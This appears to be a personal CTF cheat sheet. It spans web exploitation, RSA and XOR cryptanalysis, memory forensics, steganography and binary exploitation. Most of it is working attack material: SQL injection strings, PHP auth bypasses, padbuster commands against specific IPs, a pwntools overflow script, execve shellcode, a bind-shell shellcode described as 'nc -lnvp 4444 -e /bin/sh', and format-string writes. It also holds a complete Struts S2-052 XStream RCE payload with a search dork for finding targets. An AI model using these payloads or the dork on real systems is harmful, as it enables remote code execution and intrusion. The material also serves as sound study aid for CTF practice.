' union select 1,2,version();-- in username field

17.
#!/usr/bin/python 
f = """ 
0804851b mov al, 0x49 
0804851d mov al, 0x63 
0804851f mov al, 0x65 
08048521 mov al, 0x43 
08048523 mov al, 0x54 08048525 mov al, 0x46 08048527 mov al, 0x7b 08048529 mov al, 0x6c 0804852b mov al, 0x6f 0804852d mov al, 0x6f 0804852f mov al, 0x6b 08048531 mov al, 0x5f 08048533 mov al, 0x6d 08048535 mov al, 0x6f 08048537 mov al, 0x6d 08048539 mov al, 0x5f 0804853b mov al, 0x49 0804853d mov al, 0x5f 0804853f mov al, 0x66 08048541 mov al, 0x6f 08048543 mov al, 0x75 08048545 mov al, 0x6e 08048547 mov al, 0x64 08048549 mov al, 0x5f 0804854b mov al, 0x69 0804854d mov al, 0x74 0804854f mov al, 0x7d 
""" 
flag = "" 
for c in f.split("\n"): 
 flag = flag + chr(int(c[-4:],16)) if c != "" else flag print flag 

given binar file extract flag


18.
<?php 
require 'flag.php'; 
if (isset ($_GET['password'])) { 
if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE) 
echo '<p class="alert">You password must be alphanumeric</p>'; 
else if (strpos ($_GET['password'], '--') !== FALSE) die('Flag: ' . $flag);
 else echo '<p class="alert">Invalid password</p>'; 
} 
?>
=>http://52.10.107.64:8006/?password=aaaa%0008--

9.

<?php 
session_start(); 
// require 'flag.php'; 
if (isset ($_GET['password'])) {
 if ($_GET['password'] == $_SESSION['password']) die ('Flag: '.$flag); 
else print '<p class="alert">Wrong guess.</p>'; 
}
=>Therefore, by deleting the session cookie and sending the request http://52.10.107.64:8004/?password= we can get the flag as $_SESSION['password'] would not contain anything.


code
=========================================================================================
  if(strcmp($PASSWORD, $_GET['password']) == 0){
            $success = true;
        }
 if passed as password[]=AAAAA then it print success.

WEB
===============================================================================================
===============================================================================================
Problem
----------
The bad guys have hidden their access codes on an anonymous secure page service. Our intelligence tells us that the codes was posted on a page with id 43440b22864b30a0098f034eaf940730ca211a55, but unfortunately it's protected by a password, and only site moderators can view the post without the password. Can you help us recover the codes?
>>>for this type ctf we have to create a page with XSS payload and receive cookie and the session hijacking

Returning fake Row
------------------------
random'AND 1=0 UNION ALL SELECT 'admin' AS username, 'hax' AS password, 2000 AS user_level, 10 AS dummy, 10 AS dummy2 --

Blind Sqli
----------------
admin' AND password LIKE "ya%" --


Perl Vulneraility
===================
https://ehsandev.com/pico2014/web_exploitation/make_a_face.html
http://www.cgisecurity.com/lib/sips.html

ZIP/RAR cracker
===================
1.rar2john ./a.rar > hash.txt
  john ./hash.txt
2.fcrackzip
fcrackzip -v -u secret.zip
fcrackzip -v -m zip6 -l 4-8 -u secret.zip
PDF && PASSWORD
====================
rockyou.txt,500-passwords.txt
pdfcrack --wordlist=crackstation-human-only.txt mypassword.pdf


encryption/decryption
=========================
https://quipqiup.com/ (cryptogram)
http://rumkin.com/tools/cipher/
https://www.cs.drexel.edu/~introcs/Fa11/notes/10.1_Cryptography/RSA_Express_EncryptDecrypt.html
*if does not know what it is try vegenere cypher
 https://www.guballa.de/vigenere-solver
https://www.guballa.de/substitution-solver

FORENSIC
=================
http://stylesuxx.github.io/steganography/ 
*foremost to recover file
*unzip file using unzip so you can see also hidden file if there
*xxd -e file //hexdump with hex and value
binwalk
=============
binwalk music.mp3
binwalk --dd='.*' music.mp3

Volatility
==================
if a proceess running wireshark.exe then u can try search file abc.pcap etc
volatility -f forensic_100.raw imageinfo  //image information
volatility -f forensic_100.raw dumpfiles
volatility -f forensic_100.raw clipboard //clipboard content
volatility -f forensic_100.raw cmdscan
volatility -f forensic_100.raw cmdline
volatility -f forensic_100.raw consoles
volatility -f forensic_100.raw connections
volatility -f forensic_100.raw filescan  //file scan
volatility -f forensic_100.raw filescan|grep bat //filescan any extension like .bat,.exe,.vbs etc also can search folder name like this
also search file with system username
volatility -f forensic_100.raw dumpfiles -Q 0x..... -D folder //dump file with specified offset
volatility -f forensic_100.raw sockscan
volatility -f forensic_100.raw netscan
volatility -f forensic_100.raw connscan
volatility -f forensic_100.raw pslist       //process list only visible process
volatility -f forensic_100.raw psscan       //view hidden process also and exit time
volatility -f forensic_100.raw --profile=asd psxview //
volatility -f forensic_100.raw --profile=WinXPSP3x86 sockets //socket lists
volatility -f forensic_100.raw pslist |grep svchost
volatility -f forensic_100.raw --profile=zzxz pslist |grep tcp
volatility -f forensic_100.raw -p 1704 -D dump procdump //dump process memory
strings dump/asd.exe | pdb //compare fake file

HASH
==================
1. john --list=formats|grep -i md4
  john --format=Raw-MD4 test.md4 --show
2.john file //here in file put httpbasic auth
   
md5 hash
================
240610708=>0e462097431906509019562988736854
9QFHA$RNXGMR3IFDU=>0e11012cfa2a998691010213eebc6f98
4E8F8TK=>0e1100867d17d34f6b50be0e7d4a576d
5KWNPIES2BZZK=>0e1100864a0b680fa32cb64331ff48ad
QNKCDZO=>
BE||OJ@N =>0e110377766fb49c4d47a46eb4a1d8b8
goto https://md5db.net/explore/ for specific pattern
0e215962017 => 0e291242476940776845150308577824 //string and md5all started with 0e


** base32 data only contain CAPITAL letter and =

**input() in python equivalent to eval(raw_input())
  os.system('/bin/sh') input gives shell
**if python script is obfuscated then may try decode to decimal or something

RECYCLEBIN FORENSIC
================
use rifiuti2 

SYSTEM IMAGE FILE
================================
if u given any image file then you can mount it or use in TESTDISK.

binwalk -A floppy.img //list architecture
fdisk -l floppy.img //list partition of image
1.first try to mount it 
  mount -t vfat -o loop flopy.img ./mnt
2.recover using testdisk
  testdisk floppy.img
3.recover using  foremost
4.run using qemu
  qemu-system-x86_64 -fda floppy.img
  qemu run with gdb-peda https://github.com/VoidHack/write-ups/tree/master/Square%20CTF%202017/reverse/
5.extract using dd
  dd if=./floppy.img of=./a.zip bs=1 skip=1234 //find this 1234 offset using binwalk floppy.img
  
6.can use this https://wiki.sleuthkit.org/index.php?title=TSK_Tool_Overview


  RSA
========================================================================================

openssl rsa -in  task/bob3.pub -pubin -text -modulus
openssl rsa -pubin -inform PEM -text -noout < bob.pub

decrypt using private key + base64 encode of raw ciphertext
----------------------------------------------------------
 base64 -d flag.b64 | openssl rsautl -decrypt -inkey private.key | cat

decrypt using private key+base64 of raw encrypt file
----------------------------------------------

def decrypt_RSA(privkey, message):
    from Crypto.PublicKey import RSA  
    from base64 import b64decode 
    key = open(privkey, "r").read() 
    rsakey = RSA.importKey(key) 
    decrypted = rsakey.decrypt(b64decode(message)) 
    return decrypted
flag = "Ni45iH4UnXSttNuf0Oy80+G5J7tm8sBJuDNN7qfTIdEKJow4siF2cpSbP/qIWDjSi+w=" //base64 encode of raw encrypted file like open('enc.txt','r').read().strip().encode('hex')
print decrypt_RSA('private.key', flag)

decrypt messeage from public key + raw ciphertext file
-----------------------------------------------------
RsaCtfTool.py --publickey ./key.pub --uncipher ./flag --verbose --private //not recommended // ./flag is in base64 of raw data

generate publickey from n and e
-------------------------------
./RsaCtfTool.py --createpub --n 4152 --e 53327
for multiple key
---------------
./RsaCtfTool.py --publickey "*.key" --verbose --private
for singlekey
---------------------
./RsaCtfTool.py --publickey "a.key" --verbose --private

Decrypt using number ciphertext
-------------------------
phi = (p- 1) * (q-1)
d = libnum.modular.invmod(e, phi)
print libnum.n2s(pow(c, d, N)) //c must be in number format

Here p,q,N is number and c is ciphertext where
c1=open('a.txt','r').read().strip().encode('hex') // a.txt file contain raw encrypt data
c=0xc1 (here c1 is above cipher hex encode)

also youcan get raw cipher text from number
c is in number format.
c1=hex(c)
c=c1.decode('hex')

*common factor
*weiner attack when N is smaller than e ,also when N is in both public key
*fermar factorization when p and q are close to sqrt(N)
* if same messege encrypted with same e but different N then hastad broadcast
-------------------------------------------------------------------------------
#abctf2016
import cryptanalib as ca
n1=
c1=
n2=
c2=
n3=
c3=
c=ca.hastad_broadcast_attack([(c1,n1),(c2,n2),(c3,n3)], 3)
print ca.long_to_string(c)


 openssl s_client -connect <IP>:993 //connect to ssl /imap //also u can login via telnet
a login "username" "password" //enter if dovecot is ready


goto RsaCtfTool for different attack
usefull features in RsaCtfTool
openssl rsautl -decrypt -in $ENCRYPTED -out $PLAINTEXT -inkey keys/privkey.pem
openssl rsautl -encrypt -in $PLAINTEXT -out $PLAINTEXT.encrypt -pubin -inkey keys/pubkey.pem
 

Chinese Remainder Theorem
----------------------------
if a N has multiple prime then this method.
if u given c,n and using yafu you found multiple prime then this method.
https://github.com/diogoaj/ctf-writeups/tree/master/2018/Timisoara/crypto/NotYourAverageRSA

# From https://crypto.stackexchange.com/questions/31109/rsa-enc-decryption-with-multiple-prime-modulus-using-crt
ts = []
xs = []
ds = []
for i in range(len(primes)):
	ds.append(modinv(e, primes[i]-1))
m = primes[0]
for i in range(1, len(primes)):
	ts.append(modinv(m, primes[i]))
	m = m * primes[i]
for i in range(len(primes)):
	xs.append(pow((c%primes[i]), ds[i], primes[i]))
x = xs[0]
m = primes[0]
for i in range(1, len(primes)):
	x = x + m * ((xs[i] - x % primes[i]) * (ts[i-1] % primes[i]))
	m = m * primes[i]
print hex(x%n)[2:-1].decode("hex")



from Crypto.PublicKey import RSA
f1 = open("pubkey1.txt", "r")
key = RSA.importKey(f1.read())
print "n1 =", key.n
print "e1 =", key.e
f2 = open("pubkey1.txt", "r")
key = RSA.importKey(f1.read())
print "n1 =", key.n
print "e1 =", key.e
f3 = open("flag.enc", "r")
print f3.read().encode('hex')



from Crypto.Cipher import AES
from binascii import a2b_base64
def AES_128_ECB_decrypt(data, key):
  cipher = AES.new(key, AES.MODE_ECB)
  return cipher.decrypt(data)
filename = '7.txt'
key = 'YELLOW SUBMARINE'
data = a2b_base64(''.join(line.strip() for line in open(filename)))
print AES_128_ECB_decrypt(data, key)


def find_zero_md5md5():
  for i in xrange(0,99999999):
    t = str(i)
    ct = t
    ha = hashlib.md5()
    ha.update(ct)
    md5 = ha.hexdigest()
    ha = hashlib.md5()
    ha.update(md5+ "SALT")
    md52 = ha.hexdigest()
    if md52.startswith('0e') and md52[2:].isdigit():
      return ct,md5,md52
    if ((i % 1000000) == 0):
      print i
  return ""
a,b,c = find_zero_md5md5()
print a,b,c



openssl enc   -aes-128-ecb -a -in input2 -out output -k "YELLOW SUBMARINE"
openssl enc -d  -aes-128-ecb -a -in input2 -out output -k "YELLOW SUBMARINE"

Use factordb.com to find p and q

vigenere cypher
=============
https://www.guballa.de/vigenere-solver

XOR
==========
1.first try to guess the key like flag{ and xor with cyphertext .
   if there is more length of key then try to find them. 
2. use exortool or kasiski examination to find key length
 xortool -o a.txt
 cat xortool_out/* | string | grep flag
 


if does not know any idea what to do then xor it
XOR three file
-----------------
def xor_strings(a, b):
    return ''.join(chr(ord(i) ^ ord(j)) for i, j in zip(a, b))
heart_clear = open('Heart_clear.txt').read()
heart_crypt = open('Heart_crypt.txt').read()
key = xor_strings(heart_clear, heart_crypt)
mind_crypt = open('Mind_crypt.txt').read()
mind_clear = xor_strings(mind_crypt, key)
print mind_clear



key = '\x96\xa4*\xc3\x96\x73'
counter = 0
answer = ''
for i in open('cry200.txt', 'rb').read():
    answer += chr(ord(i)^ord(key[counter%6]))
    counter += 1
print answer

def xorr(text,key):
    return ''.join(chr(ord(a)^ord(b)) for a,b in zip(text,key))
text='KGZFK\qZFG]qA\qZFOZ'
for i in range (128):
    print xorr(text,chr(i)*len(text))


ascii checking
----------------------
if all(ord(char) < 128 for char in text2):

find length             find key                           encrypt file                        bruteforce key
---------------     -----------------------------------   -------------------------------  ----------------- -------------------
1. xortool a.txt      xortool test.txt.xor -l 10 -c 00      xortool test.txt "secret_key"    xortool -x encrypted.txt -b 

*
find key

PADDING ORACLE
=========================
Decryption
------------
padbuster http://88.198.233.174:35082/profile.php yDMsIbvCzotYY7G2sLl6vH2zuah2qqpMwt2+5Jo0VdAMHrKJ5/5Xe/67x/yfWJsWqRh3irfsreg= 8 -encoding 0 --cookie "iknowmag1k=yDMsIbvCzotYY7G2sLl6vH2zuah2qqpMwt2+5Jo0VdAMHrKJ5/5Xe/67x/yfWJsWqRh3irfsreg=;PHPSESSID=tdd5b0jl58sf70ve667r9n1et6"

Encryption
---------------
padbuster http://88.198.233.174:35082/profile.php yDMsIbvCzotYY7G2sLl6vH2zuah2qqpMwt2+5Jo0VdAMHrKJ5/5Xe/67x/yfWJsWqRh3irfsreg= 8 -encoding 0 --cookie "iknowmag1k=yDMsIbvCzotYY7G2sLl6vH2zuah2qqpMwt2+5Jo0VdAMHrKJ5/5Xe/67x/yfWJsWqRh3irfsreg=;PHPSESSID=tdd5b0jl58sf70ve667r9n1et6" -plaintext {\"user\":\"admin\",\"role\":\"admin\"}


RAW HASH
===============
9fcef3897afe2acc3e7438ce14f5b6a3   raw hash make sql injection INCTF

MEDIA
====================
mp3
-----------
https://academo.org/demos/spectrum-analyzer/

mediainfo =>info about audio/video
ffmpeg -i song.webm -map 0:2 out.wav => extract hidden audio file
multimon-ng -t wav -a DTMF out.wav =>decode dual tone

CRYPTO
=========================================================
1.Xor 2.shift 3.RotN 4.Vegenere 5.substitution

STTEGO
======================================================================================================
=====================================================================================================
1.binwalk 2.exiftool 3.ghex 4.strings 5.openstego 6.stegsolve 7.steghide(support JPEG,BMP,wav,AU)

binwalk --dd='.*' music.mp3
steghide extract -sf steghide.jpg -p password (always use this for addition info or if password protected)

if noclue about image the try reverse google image search
 
if found image ,first check binwalk file.png for hidden file then extract using dd
dd if=example.jpg bs=1 skip=1972141 of=foo.zip
foremost -t zip -i exaple.jpg -o folder

IMAGE PIXEL
===============
http://www.boyter.org/decoding-captchas/
https://github.com/VulnHub/ctf-writeups/blob/master/2015/hackim/web-500.md

from PIL import Image
im = Image.open("dead_parrot.jpg")
pix = im.load()
width,height=im.size
for i in range(width):
 for j in range(height):
  print pix[i,j]
im.save("alive_parrot.png") # Save the modified pixels as png


REVERSE ENG
=============================================================================================================
=============================================================================================================
1.gdb 2.ida 3.r2 4.hopper

netcat pwn
--------------------
from pwn import *
r = remote('ezpz.wpictf.xyz', 31337)
msg = r.recvline()
flag_address = int(msg.split(' ')[1], 16)
r.recvline()
buf  = 'A'*0x88
buf += p64(flag_address)
r.sendline(buf)
r.interactive()


**
if there is input required to validate a string or get target and after many operation it check final output then u could use angr
https://blog.techorganic.com/2018/04/21/stem-cyber-challenge-2018-keygenme/


BUFFER OVERFLOW
================
***find return address
python -c "print 'A'*32 + 'BBBB'" | strace -i ./pwn4 |& grep si_addr

***x/40wx $esp =>print stack and find whre buffer start
*** info frame =>get ebp and eip ADDRESS
***info register =>get all register
***
1.first try to find out max length by segment fault like { python -c "print 'A'*30" |./a.out }
2. now have to overwrite RT to some other function address.
    {objdump -d ./a.out }  and find the function name.
    Use gdb to find the address of that function
    now type { python -c "print 'A'*30+'\x12\x44'" |./a.out }

3. objdump -t ./a.out|grep varriable
4. print win //in gdb used tofind address of func/varriable

** 
ltrace= find dynamic librabry 
strace=  findsystem library
*****
*****another way to find length for buffer overflow
 a) first make break point after gets
 b) give input in buffer AAAAAAA
 c) print x/40wx $esp and get the buffer address //also you can find buffer start using assembly line [ lea -0x5c(%esp) %eax]
 d) print info frame // get return address(eip) //the last eip in showing result
 e) calculate length to overflow like [start buffer address]-[eip]

also can find overflow length with [python -c "print 'A'*76+'BBBB'"|strace -i ./stack5]

find eip overwritten or not / find buffer overflow length
-------------------------------------------------------
put break point after gets. give input AAAAAA... and hit breakpoint.
find start of buffer using x/120s $esp
type info frame and get first saved eip and check does it overwritten.
 
****
suppose buffer is 64 bytes and it requires 76 bytes to overwrite ebp and another 4 bytes to overwrite eip.
now we can put shellcode within 76 bytes and jump eip to start of the buffer and also put \x90 in starting of buffer. thus we can executes shellcode.
But also try to put shellcode after eip because if shellcode is large and buffer is small

putting shellcode after RT
---------------------------------
 a) python -c "print 'A'*76+'BBBB'+'C'*120"|./stack5
        now print x/10s $esp in gdb , if C found in stack then u can put shellcode after eip.
 b) python -c "print 'A'*76+'addresss where \x90 or C start to jump'+'\x90'*120+'shellcode....'"|./stack5 

  try netcat shellcode "\xbd\x9b\x77\x1c\xf3\xdd\xc0\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x14\x31\x6b\x14\x83\xeb\xfc\x03\x6b\x10\x79\x82\x2d\x28\x8a\x8e\x1d\x8d\x27\x3b\xa0\x98\x26\x0b\xc2\x57\x28\x37\x55\x3a\x40\xca\x69\xab\xcc\xa0\x79\x9a\xbc\xbd\x9b\x76\x5a\xe6\x96\x07\x2b\x57\x2d\xbb\x2f\xe8\x4b\x76\xaf\x4b\x24\xee\x62\xcb\xd7\xb6\x16\xf3\x8f\x85\x66\x42\x49\xee\x0e\x7a\x86\x7d\xa6\xec\xf7\xe3\x5f\x83\x8e\x07\xcf\x08\x18\x26\x5f\xa5\xd7\x29"
  it will create nc -lnvp 4444 -e /bin/sh command 

***
push   %ebp
mov    %esp,%ebp
and    $0xfffffff0,%esp
sub    $0x60,%esp
movl   $0x0,0x5c(%esp)
lea    0x1c(%esp),%eax
mov    %eax,(%esp)
call   0x804830c <gets@plt>

buffer address esp+0x1c stored in eax and then pushed into esp ,so we can stored value there.
if we break point after gets and print x $esp we get address of buffer esp+0x1c



shellcode
-----------
http://www.theprohack.com/2010/09/buffer-overflow-attack-tutorial-by.html
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80 => 25 bytes https://dhavalkapil.com/blogs/Shellcode-Injection/
\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80 => 32 bytes https://samsclass.info/127/proj/p3-lbuf1.htm

metasploit shellcode
-------------
msfvenom -p linux/x86/exec -f pl -b '\x0d\x0a\x00\xff' CMD=/bin/sh PrependSetresuid=true



#!/usr/bin/env python
offset = 72
shellcode = "\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80"
nopsled = "\x90" * (offset - len(shellcode))
ret = "\x90\xf7\xff\xbf"
payload = nopsled + shellcode + "JJJJ" + ret
print payload


#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}




                                push   %rbp        //push base pointer in stack
   0x0000000000400505 <+1>:	    mov    %rsp,%rbp   //asign rsp as rbp
   0x0000000000400508 <+4>:	    sub    $0x60,%rsp  //rsp move to rsp-96
   0x000000000040050c <+8>:	    mov    %edi,-0x54(%rbp)
   0x000000000040050f <+11>:	mov    %rsi,-0x60(%rbp)
   0x0000000000400513 <+15>:	movl   $0x0,-0x4(%rbp)  //move zero to rbp-4 for modified=0
   0x000000000040051a <+22>:	lea    -0x50(%rbp),%rax //buffer allocate , rbp-0x50 address of buffer where it starting move to rax
   0x000000000040051e <+26>:	mov    %rax,%rdi
   0x0000000000400521 <+29>:	callq  0x400410 <gets@plt> //call gets to this buffer
   0x0000000000400526 <+34>:	mov    -0x4(%rbp),%eax    //value of rbp-4 is 0 move to eax
   0x0000000000400529 <+37>:	test   %eax,%eax
   0x000000000040052b <+39>:	je     0x400539 <main+53>
   0x000000000040052d <+41>:	mov    $0x400648,%edi
   0x0000000000400532 <+46>:	callq  0x4003f0 <puts@plt>
   0x0000000000400537 <+51>:	jmp    0x400543 <main+63>
   0x0000000000400539 <+53>:	mov    $0x400671,%edi
   0x000000000040053e <+58>:	callq  0x4003f0 <puts@plt>
   0x0000000000400543 <+63>:	leaveq 
   0x0000000000400544 <+64>:	retq 


so here modified varriable located at rbp-4 and its value is 0.buffer start at rbp-0x50 
so we have to make it 1

so total byte need to overwrite  modified verriable at rbp-4 address is $rbp-0x50-$rbp-0x4

finding length of buffer overflow
-----------------------------------
* give input like AAAAA and if it gives segfault at specific number then it is total length from that buffer to RT.because after buffer fullit overwrite ebp then RT address.

*run gdb , set break point ,give input AAAAAA.... and it hit breakpoint .
run x/120x $esp and it gives values stored in stack
find here address of values  0x41(A) and this is start address of buffer
run x $ebp and it gives address  of $ebp
now again run x/120X $esp and find offset between previous buffer address and $ebp
ex:
(gdb) x/120x $esp
0xffffcec0:	0xfe	0xce	0xff	0xff	0x01	0x00	0x00	0x00
0xffffcec8:	0xc2	0x00	0x00	0x00	0xd1	0xd1	0xff	0xff
0xffffced0:	0xfe	0xce	0xff	0xff	0x00	0xd0	0xff	0xff
>0xffffced8:	0x00	0x00	0x00	0x00	0x41	0x41	0x41	0x41
0xffffcee0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffcee8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffcef0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffcef8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffcf00:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffcf08:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffcf10:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffcf18:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffcf20:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffcf28:	0x00	0xcf	0xff	0xff	0x1d	0x85	0x04	0x08
0xffffcf30:	0xd1	0xd1	0xff	0xff	0xf4	0xcf	0xff	0xff
here buffer start at 0xffffcedc whhere value 0x41(because we gave AAAA.. as input)
and $ebp at 0xffffcf28 ,so we can find offset between them + 4 RT
 

FORMAT STRNGS
-----------------
%n is used to write in memory
1.first find out where our data is located in stack using  => ./vuln "`python -c "print 'AAAA '+'BBBB'+'%x '*100"`"
2.it print AAAA 0xbffff.. 0xbff...  AAAA BBBB =>here do it still you your first string BBBB in last like here
3.Here you have to replace BBBB with address to write in memory. 
   
suppose address of varriable whose value to be overwrite is 0x639874
 a) ./vuln "`python -c "print 'AAAA '+'BBBB'+'%x '*100"`"
    it prints AAAA....0x...BBBB
 b) ./vuln "`python -c "print 'AAAA '+'\x74\x98\x63'+'%x '*99+'%n'"`"
   it will overwrite the value to given address
https://www.youtube.com/watch?v=0WvrSfcdq1I

 a)./vuln "`python -c "print 'AAAA'+'%x '*100"`"%x
    it prints AAAA....0x...AAAA
 b) ./vuln "`python -c "print 'address'+'%x '*100"`"%n



ROP
------------

RETURN TO LIB
---------------

STRUTS s2-052 rest plugin rce
======================
dork: filetype:action,do
*first set content type application/xml in get request and send this data
<map>
<entry>
<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>calc</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
</entry>
</map>



LINK
=========================
xmlrpc
-----------------
https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32





